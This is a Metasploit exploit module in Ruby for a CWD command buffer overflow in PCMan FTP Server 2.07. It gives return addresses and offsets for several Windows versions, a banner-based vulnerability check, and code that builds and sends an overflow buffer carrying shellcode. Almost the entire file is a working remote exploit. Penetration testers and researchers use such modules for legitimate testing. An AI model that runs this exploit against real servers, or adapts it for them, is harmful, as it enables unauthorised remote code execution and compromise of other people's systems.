##
# $Id: $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking

  include Msf::Exploit::Remote::Ftp

    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Pacman FTP 2.07 CWD Command Buffer Overflow',
            'Description'    => %q{
                    PCMAN FTP 2.07 CWD Command Buffer Overflow
            },
            'License'        => MSF_LICENSE,
            'Author'         => 
                [
                    'Mahmod Mahajna (Mahy)',
                    'Eliseo Rodriguez (f3l4r0f)'
                ],
            'Version'        => '2.07',
            'References'     =>
                [
                    ['OSVDB-ID: 94624'],
                    ['EDB',   '27703'],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'process',
                },
            'Payload'        =>
                {
                    'Space'    => 1000,
                    'BadChars' => "\x00\x0a\x2f\x5c\xff\x0d\x20\x40",
                    'StackAdjustment' => -3500,
                },
            'Platform' => 'win',
            'Targets'        =>
                [
                    #['Windows Universal?', { 'Ret' => 0x10003B81, 'Offset' => 3456} ],
                    ['Windows 8.1 x64', { 'Ret' => 0x769B6CC7, 'Offset' => 3456} ],
                    ['Windows 8 x32', { 'Ret' => 0x75968617, 'Offset' => 2008 } ],
                    ['Windows 7 SP1 x64',{ 'Ret' =>  0x754B5D3F, 'Offset' => 2008 } ],
                ],
            'Privileged'     => false,
            'DisclosureDate' => 'Enero 25,2014',
            'DefaultTarget'  => 0))

    end

    def check
        c = connect_login
        disconnect

            if c and banner =~ /220 PCMan's FTP Server 2\.0/
            # Auth is required to exploit
                print_status("Able to authenticate, and banner shows the vulnerable version")
                return Exploit::CheckCode::Vulnerable
            elsif not c and banner =~ /220 PCMan's FTP Server 2\.0/
                print_status("Unable to authenticate, but banner shows the vulnerable version")
                # Auth failed, but based on version maybe the target is vulnerable
                return Exploit::CheckCode::Appears
            end

        return Exploit::CheckCode::Safe
    end

    def exploit
        c = connect_login

        # Auth failed. The mixin should show the error, so we just bail.
        return unless c

        # Username is part of the overflowing string, so we need to account for that length
        user_length = datastore['FTPUSER'].to_s.length
      
        buffer = rand_text_alpha_upper(target['Offset'])        
        eip = [target['Ret']].pack('V')
        padding = make_nops(10)
        shellcode = payload.encoded

        sploit = buffer
        sploit << eip
        sploit << padding
        sploit << shellcode
        
        print_status("Sending exploit buffer to #{target.name}...")
        
        send_cmd(["CWD " + sploit], false)
               
        disconnect

        handler
        disconnect
    end

end
